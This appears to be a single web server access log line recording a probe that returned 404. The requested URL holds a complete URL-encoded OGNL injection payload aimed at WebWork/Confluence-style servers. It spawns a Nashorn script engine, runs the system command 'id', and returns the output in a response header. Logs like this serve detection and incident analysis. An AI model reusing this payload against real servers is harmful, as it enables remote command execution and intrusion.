183.111.204.170 - - [08/Sep/2023:17:40:04 +0900] "GET /%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22X-Cmd-Response%22%2CClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22var%20d%3D%27%27%3Bvar%20i%20%3D%20java.lang.Runtime.getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%3B%20while%28i.available%28%29%29d%2B%3DString.fromCharCode%28i.read%28%29%29%3Bd%22%29%29%7D/ HTTP/1.1" 404 1312
